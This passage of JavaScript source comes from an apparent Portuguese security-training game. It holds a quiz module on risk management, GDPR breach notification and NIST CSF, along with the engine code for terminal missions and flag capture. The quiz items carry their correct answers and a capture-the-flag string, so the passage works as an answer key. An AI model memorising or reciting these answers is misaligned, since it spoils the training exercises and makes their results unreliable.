      summary:{tecnica:"Gestão de vulnerabilidades (Security+ D4)",vetor:"Scan → CVSS → priorização por risco → gestão de patches/controlos compensatórios",ferramentas:"nmap --script vuln",licao:"O CVSS é o ponto de partida, não o fim: o contexto (exposição, autenticação, exploit ativo) define a prioridade real. Remediar com método — testar, agendar, ter rollback — e mitigar com controlos compensatórios quando não há patch."}
    }
  ]
},

/* ===================== GRC-01 — GOVERNANÇA, RISCO E CONFORMIDADE (gov / D5) ===================== */
{
  id:"GRC-01", code:"GRC", title:"Governança, Risco e Conformidade", track:"gov", domain:"D5",
  blurb:"O domínio que vale 1/5 do exame e que quase ninguém treina: gestão de risco, políticas, RGPD e os frameworks que regem um programa de segurança. Decisões de gestão, não de terminal.",
  tags:["Gestão de Risco","RGPD","Políticas","NIST/ISO","Conformidade"],
  intro:[
    {t:"sys",x:"[ ACADEMIA ] Módulo de governança — Domínio 5 (Gestão e Supervisão do Programa de Segurança)."},
    {t:"sys",x:"[ ACADEMIA ] Pesa ~20% do programa e diferencia quem percebe segurança de quem só conhece ferramentas."},
    {t:"warnline",x:"[ ACADEMIA ] Aqui pensa-se em risco, lei e processo. Contexto da UE/Portugal incluído."}
  ],
  steps:[
    {
      type:"choice", n:"risktreat", short:"Tratar risco",
      eyebrow:"Fase 01 · Tratamento do risco",
      title:"Escolher a estratégia de tratamento de risco",
      dossier:`<p class="lead">Perante um risco, há quatro respostas: <b>Mitigar</b> (reduzir com controlos), <b>Transferir</b> (ex.: seguro), <b>Evitar</b> (deixar de fazer a atividade) ou <b>Aceitar</b> (assumir, se for baixo e o custo de mitigar não compensar).</p>`,
      concepts:[
        {term:"Mitigar, transferir, evitar, aceitar",
         body:`<b>Mitigar</b>: implementar controlos. <b>Transferir</b>: passar o impacto financeiro a terceiros (seguro, fornecedor). <b>Evitar</b>: eliminar a fonte do risco. <b>Aceitar</b>: decisão documentada e aprovada de conviver com um risco residual baixo.`}
      ],
      question:"Uma funcionalidade antiga e pouco usada tem um risco residual baixo, e o custo de a proteger é muito superior ao impacto possível. Qual é a estratégia mais adequada?",
      options:[
        {label:"Aceitar o risco — documentado e aprovado pela gestão, por ser baixo e a mitigação não compensar",correct:true,
         explain:"Correto. Aceitação formal é uma resposta válida quando o risco é baixo e o custo de mitigar excede o benefício. Tem de ser registada e aprovada."},
        {label:"Mitigar a todo o custo, gastando o que for preciso",
         explain:"Gastar mais do que o impacto possível é mau uso de recursos. A gestão de risco também é económica."},
        {label:"Ignorar e não registar nada",
         explain:"Aceitar ≠ ignorar. A aceitação tem de ser uma decisão consciente, documentada e aprovada — não silêncio."}
      ],
      reveal:"Boa decisão. Mas como se mede um risco para decidir?"
    },
    {
      type:"choice", n:"riskcalc", short:"Medir risco",
      eyebrow:"Fase 02 · Avaliação de risco",
      title:"Quantificar o risco",
      dossier:`<p class="lead">Risco = <b>probabilidade × impacto</b>. Um evento raro mas catastrófico pode exigir mais atenção do que um frequente mas trivial. O <b>registo de risco</b> documenta e ordena tudo.</p>`,
      concepts:[
        {term:"Probabilidade × impacto e risco residual",
         body:`Risco inerente é o risco antes dos controlos; <b>risco residual</b> é o que sobra depois. O <b>apetite de risco</b> da organização define quanto residual é aceitável. Métricas: SLE, ARO e ALE na análise quantitativa.`}
      ],
      question:"O risco A é muito provável mas de impacto trivial (1h de lentidão). O risco B é raro mas catastrófico (fuga de dados de todos os alunos). Qual exige prioridade na análise?",
      options:[
        {label:"Risco B — o impacto catastrófico domina a equação, mesmo com baixa probabilidade",correct:true,
         explain:"Correto. Probabilidade × impacto: um impacto extremo (fuga massiva, com consequências legais) supera um incómodo frequente mas trivial."},
        {label:"Risco A — porque acontece mais vezes",
         explain:"Frequência sozinha não define prioridade. Um incómodo trivial repetido não se compara a uma fuga catastrófica de dados pessoais."},
        {label:"Nenhum — só importam os riscos com 100% de probabilidade",
         explain:"A gestão de risco lida exatamente com a incerteza. Esperar pela certeza é não fazer gestão de risco nenhuma."}
      ],
      reveal:"Certo. Falando de fuga de dados pessoais — entra o RGPD."
    },
    {
      type:"choice", n:"gdpr", short:"RGPD",
      eyebrow:"Fase 03 · Conformidade (RGPD)",
      title:"Obrigação de notificação no RGPD",
      dossier:`<p class="lead">Na UE, o <b>RGPD</b> obriga a notificar a autoridade de controlo (em Portugal, a <b>CNPD</b>) de uma violação de dados pessoais <b>sem demora injustificada e, se possível, em 72 horas</b> após o conhecimento, quando há risco para os titulares.</p>`,
      concepts:[
        {term:"RGPD: violação de dados e prazos",
         body:`Prazo-chave: <b>72 horas</b> para notificar a autoridade de controlo. Se a violação implicar <b>risco elevado</b> para os direitos dos titulares, estes também têm de ser informados. Coimas até 20 M€ ou 4% do volume de negócios global. Documentar toda a violação é obrigatório, mesmo as não notificáveis.`}
      ],
      question:"O IPB deteta uma fuga que expôs dados pessoais de alunos. Segundo o RGPD, qual é a obrigação de notificação?",
      options:[
        {label:"Notificar a autoridade de controlo (CNPD) sem demora e, se possível, em 72 horas; informar os titulares se houver risco elevado",correct:true,
         explain:"Correto. 72 horas para a autoridade de controlo; e comunicação aos titulares quando a violação implica risco elevado para os seus direitos."},
        {label:"Não há obrigação nenhuma desde que a fuga seja interna",
         explain:"Falso. O RGPD aplica-se a violações de dados pessoais independentemente de serem internas; há dever de notificar a autoridade."},
        {label:"Basta notificar daqui a um ano, na auditoria seguinte",
         explain:"Muito longe do exigido. O prazo é apertado — 72 horas — precisamente para permitir reação atempada."}
      ],
      reveal:"Conformidade interiorizada. Por fim, o que rege o programa todo?"
    },
    {
      type:"choice", n:"frameworks", short:"Frameworks",
      eyebrow:"Fase 04 · Frameworks e políticas",
      title:"Reconhecer os frameworks de governança (e a flag)",
      dossier:`<p class="lead">Um programa de segurança apoia-se em <b>frameworks</b>: o <b>NIST CSF</b> (Identificar, Proteger, Detetar, Responder, Recuperar) estrutura a gestão; a <b>ISO/IEC 27001</b> certifica um SGSI; políticas como <b>AUP</b> e classificação de dados operacionalizam as regras.</p>`,
      concepts:[
        {term:"NIST CSF, ISO 27001 e políticas",
         body:`<b>NIST CSF</b>: framework de funções para gerir risco cibernético. <b>ISO/IEC 27001</b>: norma certificável para um Sistema de Gestão de Segurança da Informação. <b>Políticas</b>: AUP (uso aceitável), classificação de dados, resposta a incidentes — traduzem a estratégia em regras concretas.`}
      ],
      question:"A direção quer uma estrutura reconhecida internacionalmente para organizar a gestão de risco cibernético em cinco funções (Identificar, Proteger, Detetar, Responder, Recuperar). A que se referem?",
      options:[
        {label:"NIST Cybersecurity Framework (CSF)",correct:true,
         explain:"Correto. As cinco funções (Identify, Protect, Detect, Respond, Recover) são a espinha dorsal do NIST CSF."},
        {label:"OWASP Top 10",
         explain:"O OWASP Top 10 lista riscos de aplicações web — útil, mas não é um framework de governação de risco em cinco funções."},
        {label:"GTFOBins",
         explain:"GTFOBins é um catálogo de binários abusáveis para escalada de privilégios — nada tem que ver com governança."}
      ],
      flag:"FLAG{GRC_R1SK_RGPD_N1ST_PT}",
      reveal:"Programa de segurança compreendido de ponta a ponta.",
      summary:{tecnica:"Governança, risco e conformidade (Security+ D5)",vetor:"Tratamento e medição de risco · RGPD (72h/CNPD) · NIST CSF · ISO 27001 · políticas",ferramentas:"Processo & gestão",licao:"Risco = probabilidade × impacto, com quatro respostas (mitigar/transferir/evitar/aceitar). O RGPD exige notificação em 72 horas à autoridade de controlo. Frameworks (NIST CSF, ISO 27001) e políticas dão estrutura ao programa."}
    }
  ]
}
];

/* ============================================================
   ESTADO
   ============================================================ */
const G={
  mission:null, stepIdx:0, score:0, flags:0, threat:0,
  readConcepts:new Set(), captured:[], completedMissions:new Set(),
  ctx:null, busy:false
};

/* ============================================================
   BOOT SEQUENCE
   ============================================================ */
const bootLines=[
  {t:'dim',x:'NetSec Academy — Plataforma de Treino Ofensivo v3.7'},
  {t:'',x:'[ BIOS ] A inicializar ambiente isolado de auditoria...'},
  {t:'ok',x:'[  OK  ] kernel hardened carregado'},
  {t:'ok',x:'[  OK  ] sandbox de rede 10.1.2.0/24 ativa'},
  {t:'',x:'[ AUTH ] A validar credenciais de analista júnior...'},
  {t:'ok',x:'[  OK  ] sessão estabelecida: analista@netsec'},
  {t:'warn',x:'[ AVISO ] Disparar comandos sem ler a teoria gera ALERTAS DE IDS.'},
  {t:'',x:'[ LOAD ] A carregar dossiês: IPB · wp.looz.com · Marco Ribeiro...'},
  {t:'ok',x:'[  OK  ] 3 operações disponíveis'},
  {t:'dim',x:''},
  {t:'ok',x:'>> Sistema pronto. Bem-vindo, analista.'}
];
async function runBoot(){
  const log=$('#bootLog');
  for(const ln of bootLines){
    const span=el('div',ln.t);
    log.appendChild(span);
    if(reduce){span.textContent=ln.x;}
    else{
      for(let i=0;i<ln.x.length;i++){span.textContent=ln.x.slice(0,i+1);await sleep(6);}
    }
    await sleep(reduce?20:90);
  }
  const cur=el('span','cursor');log.appendChild(cur);
  $('#bootCta').classList.add('show');
}
$('#bootStart').addEventListener('click',()=>{
  $('#boot').style.display='none';
  $('#app').classList.add('live');
  openMissionSelect();
});
runBoot();

/* ============================================================
   TERMINAL OUTPUT
   ============================================================ */
const out=$('#termOut');
function scrollTerm(){out.scrollTop=out.scrollHeight;}
function printLine(text,cls){
  const d=el('div','line '+(cls||''));d.innerHTML=text;out.appendChild(d);scrollTerm();return d;
}
function printPrompt(cmd){
  const ps=G.ctx?G.ctx:'analista@netsec';
  printLine('<span class="prompt"><span class="u">'+esc(ps.split('@')[0])+'</span>@'+esc(ps.split('@')[1]||'netsec')+':<span class="p">~</span>$ </span><span class="typed">'+esc(cmd)+'</span>');
}
async function typeOut(lines){
  for(const l of lines){
    const cls={sys:'sys',good:'good',warnline:'warnline',errline:'errline',line:'',flag:'flagline',ascii:'ascii'}[l.t]||'';
    if(reduce){printLine(esc(l.x),cls);continue;}
    const d=printLine('',cls);
    const txt=l.x;
    for(let i=0;i<txt.length;i+=2){d.textContent=txt.slice(0,i+2);scrollTerm();await sleep(3);}
    d.textContent=txt;
    await sleep(40);
  }
}

/* ============================================================
   RENDER: KNOWLEDGE PANEL
   ============================================================ */
function curMission(){return G.mission;}
function curStep(){return G.mission?G.mission.steps[G.stepIdx]:null;}

function renderKnow(){
  const kb=$('#knowBody');kb.innerHTML='';
  const m=curMission(); if(!m){return;}
  const s=curStep();
  kb.appendChild(el('div','step-eyebrow',esc(s.eyebrow)));
  kb.appendChild(el('h2','step-title',s.title));
  const dos=el('div','dossier');dos.innerHTML=s.dossier||'';kb.appendChild(dos);

  if(s.type==='inspect'){ renderInspect(kb,s); }
  else if(s.type==='answer'){ renderAnswer(kb,s); }
  else if(s.type==='choice'){ renderChoice(kb,s); }
  else if(s.type==='triage'){ renderTriage(kb,s); }
  else if(s.type==='loghunt'){ renderLogHunt(kb,s); }
  else { renderConcepts(kb,s); }

  updateGateNote();
}

function conceptId(stepIdx,ci){return G.mission.id+':'+stepIdx+':'+ci;}

function renderConcepts(kb,s){
  kb.appendChild(el('div','concepts-label','Conceitos a desbloquear'));
  s.concepts.forEach((cc,ci)=>{
    const cid=conceptId(G.stepIdx,ci);
    const read=G.readConcepts.has(cid);
    const node=el('div','concept'+(read?' read':''));
    const head=el('div','concept-head');
    head.innerHTML='<span class="concept-chev">▶</span><span class="concept-term">'+cc.term+'</span>'+
      '<span class="concept-status">'+(read?'lido':cc.status)+'</span>';
    node.appendChild(head);
    const body=el('div','concept-body');
    body.innerHTML='<p style="margin:12px 0 0">'+cc.body+'</p>';
    if(cc.load){
      const btn=el('button','load-btn','<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> Carregar comando no terminal');
      btn.addEventListener('click', e=>{e.stopPropagation();markRead(cid,cc);loadCommand(cc.load);});
      body.appendChild(btn);
    }
    node.appendChild(body);
    head.addEventListener('click',()=>{
      node.classList.toggle('open');
      if(node.classList.contains('open')) markRead(cid,cc);
    });
    kb.appendChild(node);
  });
}

function markRead(cid,cc){
  if(G.readConcepts.has(cid))return;
  G.readConcepts.add(cid);
  document.querySelectorAll('.concept').forEach(()=>{});
  renderKnow();
  if(cc&&cc.status){ awardKnowledge(); }
  updateGateNote();
}

function loadCommand(cmd){
  const inp=$('#cmd'); inp.value=cmd; inp.focus();
  inp.setSelectionRange(cmd.length,cmd.length);
  flashInput();
}
function flashInput(){
  const row=$('#inputRow');row.style.transition='none';row.style.boxShadow='inset 0 0 0 1px var(--green)';
  setTimeout(()=>{row.style.transition='box-shadow .6s';row.style.boxShadow='none';},40);
}

/* gate logic: all gate concepts of the step must be read */
function stepGated(){
  const s=curStep(); if(!s||s.type!=='command')return false;
  const gates=s.concepts.map((c,i)=>({c,i})).filter(o=>o.c.gate);
  const need=gates.length?gates:s.concepts.map((c,i)=>({c,i}));
  return need.some(o=>!G.readConcepts.has(conceptId(G.stepIdx,o.i)));
}
function updateGateNote(){
  const note=$('#gateNote');const s=curStep();
  if(!s){note.textContent='';return;}
  if(s.type!=='command'){note.textContent='';return;}
  if(stepGated()){note.innerHTML='🔒 lê o conceito para armar o comando';}
  else{note.innerHTML='<span style="color:var(--green)">✓ comando armado</span>';}
}

/* inspect step */
function renderInspect(kb,s){
  kb.appendChild(el('div','concepts-label','Código-fonte vazado — clica na linha vulnerável'));
  const cb=el('div','codeblock');
  s.code.forEach((row,i)=>{
    const ln=el('div','ln'); ln.dataset.i=i;
    ln.innerHTML='<span class="gut">'+(i+1)+'</span><span class="code">'+(row.c||' ')+'</span>';
    ln.addEventListener('click',()=>handleInspect(i,s,ln));
    cb.appendChild(ln);
  });
  kb.appendChild(cb);
  kb.appendChild(el('div','answer-hint','Procura onde uma propriedade controlável pelo atacante alimenta um <code>include()</code>.'));
}
function handleInspect(i,s,ln){
  if(G.busy)return;
  if(i===s.badLine){
    ln.classList.add('bad');
    printPrompt('# auditoria: linha '+(i+1)+' marcada como vulnerável');
    typeOut([{t:'good',x:'[+] Vulnerabilidade confirmada na linha '+(i+1)+': include($this->type_log)'}]);
    toast('ach','Linha identificada','PHP Object Injection localizada');
    G.score+=120; updateStats();
    setTimeout(()=>advanceStep(s.successReveal),700);
  }else{
    idsAlert('Linha incorreta — análise apressada');
    typeOut([{t:'errline',x:'[!] Linha '+(i+1)+' não é o problema. '+s.failReveal}]);
  }
}

/* answer step */
function renderAnswer(kb,s){
  kb.appendChild(el('div','concepts-label','Responde para avançar'));
  const box=el('div','answerbox');
  box.innerHTML='<label class="answer-hint" style="display:block;margin-bottom:8px;color:var(--cyan)">'+esc(s.answerLabel)+'</label>'+
    '<input id="ansInput" placeholder="a tua resposta…">'+
    '<div class="row"><button id="ansBtn">Submeter</button></div>'+
    '<div class="answer-hint">💡 '+s.answerHint+'</div>';
  kb.appendChild(box);
  const submit=()=>{
    const v=($('#ansInput').value||'').trim().toLowerCase();
    if(!v)return;
    const ok=s.accept.some(a=>v.includes(a.toLowerCase())||a.toLowerCase().includes(v)&&v.length>3);
    if(ok){
      printPrompt('# unzip -P "'+$('#ansInput').value.trim()+'" cofre.zip');
      typeOut([{t:'good',x:'[+] Password correta. cofre.zip extraído.'}]);
      toast('ach','Cofre aberto',s.answerLabel.replace(':',''));
      G.score+=140;updateStats();
      setTimeout(()=>advanceStep(s.successReveal),700);
    }else{
      idsAlert('Tentativa de password falhada');
      typeOut([{t:'errline',x:'[!] Password incorreta. '+s.failReveal}]);
    }
  };
  setTimeout(()=>{
    const b=$('#ansBtn'),inp=$('#ansInput');
    if(b)b.addEventListener('click',submit);
    if(inp)inp.addEventListener('keydown',e=>{if(e.key==='Enter')submit();});
  },10);
}

/* ---- teaching cards (non-gating, for interactive steps) ---- */
function renderTeach(kb,concepts){
  if(!concepts||!concepts.length)return;
  kb.appendChild(el('div','concepts-label','Conceitos-chave'));
  concepts.forEach(cc=>{
    const node=el('div','concept');
    const head=el('div','concept-head');
    head.innerHTML='<span class="concept-chev">▶</span><span class="concept-term"></span><span class="concept-status">conceito</span>';
    head.querySelector('.concept-term').innerHTML=cc.term;
    node.appendChild(head);
    const body=el('div','concept-body');body.innerHTML='<p style="margin:12px 0 0">'+cc.body+'</p>';node.appendChild(body);
    let awarded=false;
    head.addEventListener('click',()=>{node.classList.toggle('open');if(!awarded){awarded=true;awardKnowledge();}});
    kb.appendChild(node);
  });
}
function finishInteractive(s){ if(s.flag){captureFlag(s);} else {advanceStep(s.reveal);} }

/* ---- multiple-choice analyst decision ---- */
function renderChoice(kb,s){
  renderTeach(kb,s.concepts);
  kb.appendChild(el('div','concepts-label','Decisão de analista'));
  const q=el('div','choice-q');q.textContent=s.question;kb.appendChild(q);
  let done=false;
  s.options.forEach(op=>{
    const b=el('button','choice-opt');b.textContent=op.label;
    b.addEventListener('click',()=>{
      if(done)return;
      const ex=el('div','choice-exp'+(op.correct?'':' bad'));
      ex.textContent=(op.correct?'✓ ':'✗ ')+(op.explain||(op.correct?'Correto.':'Reconsidera.'));
      if(op.correct){
        done=true;b.classList.add('ok');
        if(b.nextSibling)kb.insertBefore(ex,b.nextSibling);else kb.appendChild(ex);
        G.score+=90;updateStats();toast('ach','Análise correta',s.short);
        setTimeout(()=>finishInteractive(s),900);
      }else{
        b.classList.add('bad');b.disabled=true;analystError('Resposta incorreta');
        if(b.nextSibling)kb.insertBefore(ex,b.nextSibling);else kb.appendChild(ex);
      }
    });
    kb.appendChild(b);
  });
}

/* ---- SIEM alert triage ---- */
const SEV=[
  {k:'crit',label:'Crítico',col:'#ff3b5c'},
  {k:'high',label:'Alto',col:'#ff8a3d'},
  {k:'med',label:'Médio',col:'#ffb454'},
  {k:'low',label:'Baixo',col:'#58e6ff'},
  {k:'fp',label:'Falso Positivo',col:'#7c9488'}
];
function renderTriage(kb,s){
  renderTeach(kb,s.concepts);
  kb.appendChild(el('div','concepts-label','Fila do SIEM — classifica a severidade de cada alerta'));
  const resolved=new Set(),total=s.alerts.length;
  s.alerts.forEach((al,i)=>{
    const card=el('div','triage-alert');
    card.innerHTML='<div class="ta-head"><span class="ta-src"></span><span class="ta-sev">por classificar</span></div>'+
      '<div class="ta-sig"></div><div class="ta-raw"></div>';
    card.querySelector('.ta-src').textContent=al.src;
    card.querySelector('.ta-sig').textContent=al.sig;
    card.querySelector('.ta-raw').textContent=al.raw||'';
    const row=el('div','sev-row');
    SEV.forEach(sv=>{
      const b=el('button','sev-btn');b.textContent=sv.label;b.style.borderColor=sv.col;b.style.color=sv.col;
      b.addEventListener('click',()=>{
        if(resolved.has(i))return;
        if(sv.k===al.sev){
          resolved.add(i);card.classList.add('ok');
          const sev=card.querySelector('.ta-sev');sev.textContent=sv.label;sev.style.color=sv.col;
          const w=el('div','ta-why');w.textContent='✓ '+al.why;card.appendChild(w);
          row.remove();G.score+=45;updateStats();
          if(resolved.size===total){toast('ach','Fila tratada',s.short);setTimeout(()=>finishInteractive(s),700);}
        }else{
          analystError('Triagem incorreta · '+al.src);
          card.classList.add('shake');setTimeout(()=>card.classList.remove('shake'),420);
        }
      });
      row.appendChild(b);
    });
    card.appendChild(row);
    kb.appendChild(card);
  });
}

/* ---- log hunting (multi-select malicious lines) ---- */
function renderLogHunt(kb,s){
  renderTeach(kb,s.concepts);
  kb.appendChild(el('div','concepts-label','Log — seleciona TODAS as linhas maliciosas, depois confirma'));
  const sel=new Set();
  const cb=el('div','codeblock loghunt');
  s.logs.forEach((rowd,i)=>{
    const ln=el('div','ln');ln.innerHTML='<span class="gut">'+(i+1)+'</span><span class="code"></span>';
    ln.querySelector('.code').textContent=rowd.c;
    ln.addEventListener('click',()=>{
      if(ln.classList.contains('bad'))return;
      if(sel.has(i)){sel.delete(i);ln.classList.remove('sel');}else{sel.add(i);ln.classList.add('sel');}
    });
    cb.appendChild(ln);
  });
  kb.appendChild(cb);
  const bad=new Set(s.logs.map((r,i)=>r.bad?i:-1).filter(i=>i>=0));
  const btn=el('button','load-btn');btn.style.marginTop='4px';
  btn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg> Confirmar análise';
  btn.addEventListener('click',()=>{
    const ok = sel.size===bad.size && [...bad].every(i=>sel.has(i));
    if(ok){
      cb.querySelectorAll('.ln').forEach((ln,i)=>{ln.classList.remove('sel');if(bad.has(i))ln.classList.add('bad');});
      btn.remove();G.score+=120;updateStats();toast('ach','Análise correta',s.short);
      setTimeout(()=>finishInteractive(s),800);
    }else{
      analystError('Seleção de linhas incorreta');
      const miss=[...bad].filter(i=>!sel.has(i)).length, fp=[...sel].filter(i=>!bad.has(i)).length;
      printPrompt('# verificar seleção');
      typeOut([{t:'errline',x:'[!] Faltam '+miss+' linha(s) maliciosa(s) · '+fp+' falso(s) positivo(s) marcado(s). Revê os pedidos anómalos.'}]);
    }
  });
  kb.appendChild(btn);
}

/* ============================================================
   TRAIL (breadcrumb signature)
   ============================================================ */
function renderTrail(){
  const t=$('#trail');t.innerHTML='<span class="trail-label">Trilho</span>';
  const m=curMission(); if(!m)return;
  m.steps.forEach((s,i)=>{
    const c=el('div','crumb'+(i<G.stepIdx?' done':'')+(i===G.stepIdx?' current':''));
    let h='<div class="node" data-n="'+esc(s.short)+'"></div>';
    if(i<m.steps.length-1) h+='<div class="link"></div>';
    c.innerHTML=h;
    t.appendChild(c);
  });
}

/* ============================================================
   STATS / SCORE / THREAT
   ============================================================ */
function updateStats(){
  $('#statScore').textContent=G.score;
  $('#statFlags').textContent=G.flags;
  $('#threatFill').style.width=Math.min(100,G.threat)+'%';
}
function awardKnowledge(){ G.score+=15; updateStats(); }

function idsAlert(reason){
  G.threat=Math.min(100,G.threat+18);
  G.score=Math.max(0,G.score-25);
  updateStats();
  const f=$('#idsFlash');f.classList.remove('go');void f.offsetWidth;f.classList.add('go');
  toast('ids','⚠ ALERTA DE IDS', reason+' · −25 pts');
}
function analystError(reason){
  G.score=Math.max(0,G.score-20);
  updateStats();
  const f=$('#idsFlash');f.classList.remove('go');void f.offsetWidth;f.classList.add('go');
  toast('ids','✗ Erro de análise', reason+' · −20 pts');
}

/* ============================================================
   TOASTS
   ============================================================ */
function toast(kind,title,body){
  const wrap=$('#toasts');
  const t=el('div','toast '+(kind==='ach'?'ach':kind==='ids'?'ids':''));
  t.innerHTML='<div class="tt">'+esc(title)+'</div><div class="tb">'+esc(body)+'</div>';
  wrap.appendChild(t);
  requestAnimationFrame(()=>t.classList.add('show'));
  setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),450);},3600);
}

/* ============================================================
   COMMAND EXECUTION
   ============================================================ */
const cmdInput=$('#cmd');
cmdInput.addEventListener('keydown',e=>{
  if(e.key==='Enter'){const v=cmdInput.value.trim();cmdInput.value='';if(v)runCommand(v);}
});

const AMBIENT={
  help:()=>[
    {t:'sys',x:'Comandos do ambiente: help, ls, whoami, clear, hint, objetivo, missoes'},
    {t:'sys',x:'Comandos da missão: carrega-os clicando nos conceitos do painel esquerdo.'},
    {t:'warnline',x:'Disparar comandos da missão sem ler a teoria = ALERTA DE IDS.'}
  ],
  whoami:()=>[{t:'good',x:(G.ctx?G.ctx.split('@')[0]:'analista')}],
  ls:()=>[{t:'line',x:'dossiers/   wordlists/   loot/   notas.txt'}],
  objetivo:()=>{const s=curStep();return [{t:'warnline',x:'» '+(s?s.title:'—')+' :: '+(s?s.eyebrow:'')}];},
  pwd:()=>[{t:'line',x:G.ctx?'/home/'+G.ctx.split('@')[0]:'/home/analista'}]
};

async function runCommand(raw){
  if(G.busy){return;}
  const cmd=raw.trim();
  const low=cmd.toLowerCase();
  printPrompt(cmd);

  if(low==='clear'){out.innerHTML='';return;}
  if(low==='missoes'){openMissionSelect();return;}
  if(low==='hint'){const s=curStep();typeOut([{t:'sys',x:'💡 '+(s&&s.hint?s.hint:'Lê os conceitos à esquerda.')}]);return;}
  if(AMBIENT[low]){typeOut(AMBIENT[low]());return;}

  const m=curMission(),s=curStep();
  if(!m||!s){typeOut([{t:'errline',x:'Sem missão ativa. Escreve "missoes".'}]);return;}
  if(s.type!=='command'){typeOut([{t:'sys',x:'Este passo resolve-se no painel esquerdo, não no terminal.'}]);return;}

  // gate check
  if(stepGated()){
    idsAlert('Comando disparado sem ler a teoria');
    typeOut([
      {t:'errline',x:'[IDS] Tentativa cega detetada. O comando não foi executado.'},
      {t:'sys',x:'Lê e desbloqueia o conceito no Painel de Conhecimento antes de disparar.'}
    ]);
    return;
  }

  // correctness check
  if(s.test(cmd)){
    G.busy=true; cmdInput.disabled=true;
    await typeOut(s.output());
    if(s.ctx!==undefined) G.ctx=s.ctx;
    updatePs1();
    if(s.flag){
      await sleep(180);
      captureFlag(s);
    }else{
      G.score+=80;updateStats();
      toast('ach','Passo concluído', s.short);
      await sleep(300);
      advanceStep(s.reveal);
    }
    G.busy=false; cmdInput.disabled=false; cmdInput.focus();
  }else{
    // armed but wrong syntax — soft fail, no IDS
    typeOut([
      {t:'errline',x:'[x] Sintaxe não corresponde ao objetivo deste passo.'},
      {t:'sys',x:'💡 '+(s.hint||'Revê o comando carregado a partir do conceito.')}
    ]);
  }
}

function updatePs1(){
  const ps=$('#ps1');
  if(G.ctx){
    const [u,h]=G.ctx.split('@');
    const root=u==='root';
    ps.innerHTML='<span style="color:'+(root?'var(--red)':'var(--green-bright)')+'">'+esc(u)+'</span>@'+esc(h)+'<span style="color:var(--text)">:</span><span class="p">~</span>'+(root?'#':'$');
    $('#termHost').textContent=G.ctx+' : ~';
  }else{
    ps.innerHTML='analista@netsec<span style="color:var(--text)">:</span><span class="p">~</span>$';
    $('#termHost').textContent='analista@netsec : ~';
  }
}

/* ============================================================
   FLAG CAPTURE
   ============================================================ */
const FLAG_ART=[
" ____ ____ ____ ____ ",
"||F |||L |||A |||G ||",
"||__|||__|||__|||__||",
"|/__\\|/__\\|/__\\|/__\\|"
];
async function captureFlag(s){
  G.flags++; G.score+=250; G.threat=Math.max(0,G.threat-8); updateStats();
  await typeOut(FLAG_ART.map(x=>({t:'ascii',x})));
  await typeOut([{t:'flag',x:'>>> '+s.flag+' <<<'}]);
  G.captured.push({mission:G.mission.title,step:s.title,flag:s.flag,summary:s.summary||null});
  showFlagModal(s);
}

function showFlagModal(s){
  const m=$('#modal');
  const sum=s.summary||{};
  m.innerHTML=
   '<div class="mh"><span class="ic">🚩</span><div><h3>Flag Capturada</h3>'+
     '<div class="mtag">'+esc(G.mission.id)+' · '+esc(s.title)+'</div></div></div>'+
   '<div class="mb">'+
     '<div class="flagcard"><div class="fk">Flag</div><div class="fl">'+esc(s.flag)+'</div></div>'+
     '<div class="fk" style="font-size:10px;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Card de Resumo Técnico</div>'+
     '<div class="summary-grid">'+
       row('Técnica',sum.tecnica)+row('Vetor',sum.vetor)+row('Ferramentas',sum.ferramentas)+
       '<div class="sr"><span class="sk">Lição</span><span class="sv">'+esc(sum.licao||'—')+'</span></div>'+
     '</div>'+
   '</div>'+
   '<div class="mf">'+
     '<button class="mbtn ghost" id="mClose">Fechar</button>'+
     '<button class="mbtn amber" id="mNext">'+(isLastStep()?'Concluir missão ▶':'Próximo passo ▶')+'</button>'+
   '</div>';
  function row(k,v){return '<div class="sr"><span class="sk">'+k+'</span><span class="sv">'+esc(v||'—')+'</span></div>';}
  $('#modalBg').classList.add('show');
  $('#mClose').onclick=closeModal;
  $('#mNext').onclick=()=>{closeModal();
    if(isLastStep()) finishMission(); else advanceStep(s.reveal);
  };
}
function isLastStep(){return G.stepIdx>=G.mission.steps.length-1;}
function closeModal(){$('#modalBg').classList.remove('show');}

/* ============================================================
   STEP / MISSION FLOW
   ============================================================ */
function advanceStep(reveal){
  if(reveal){typeOut([{t:'sys',x:'» '+reveal}]);}
  if(G.stepIdx<G.mission.steps.length-1){
    G.stepIdx++;
    renderKnow();renderTrail();
    setTimeout(()=>{
      const s=curStep();
      typeOut([{t:'warnline',x:'[ NOVO OBJETIVO ] '+s.title+' — '+s.eyebrow}]);
    },200);
  }else{
    finishMission();
  }
  cmdInput.focus();
}

function finishMission(){
  G.completedMissions.add(G.mission.id);
  const m=$('#modal');
  const idx=MISSIONS.findIndex(x=>x.id===G.mission.id);
  const next=MISSIONS[idx+1];
  const allDone=G.completedMissions.size>=MISSIONS.length;
  m.innerHTML=
   '<div class="mh"><span class="ic">🏆</span><div><h3>Missão Concluída</h3>'+
     '<div class="mtag">'+esc(G.mission.id)+' · '+esc(G.mission.title)+'</div></div></div>'+
   '<div class="mb">'+
     '<p style="margin:0 0 14px;color:var(--text)">Operação encerrada com sucesso. Todas as flags desta cadeia foram capturadas.</p>'+
     '<div class="summary-grid">'+
       '<div class="sr"><span class="sk">Pontuação</span><span class="sv">'+G.score+' pts</span></div>'+
       '<div class="sr"><span class="sk">Flags totais</span><span class="sv">'+G.flags+'</span></div>'+
       '<div class="sr"><span class="sk">Ameaça final</span><span class="sv">'+Math.round(G.threat)+'%</span></div>'+
     '</div>'+
     (allDone?'<div class="flagcard" style="margin-top:16px;border-color:var(--green-dim)"><div class="fk">Conquista</div><div class="fl" style="color:var(--green-bright)">🎖 ANALISTA CERTIFICADO — todas as operações concluídas</div></div>':'')+
   '</div>'+
   '<div class="mf">'+
     '<button class="mbtn ghost" id="mGuide2">⬇ Guia de estudo</button>'+
     '<button class="mbtn" id="mSel">Missões</button>'+
     (next&&!G.completedMissions.has(next.id)?'<button class="mbtn amber" id="mNextM">Próxima: '+esc(next.title)+' ▶</button>':'')+
   '</div>';
  $('#modalBg').classList.add('show');
  toast('ach','🏆 Missão concluída',G.mission.title);
  if(allDone) setTimeout(()=>toast('ach','🎖 Certificação','Todas as operações concluídas!'),800);
  $('#mGuide2').onclick=exportGuide;
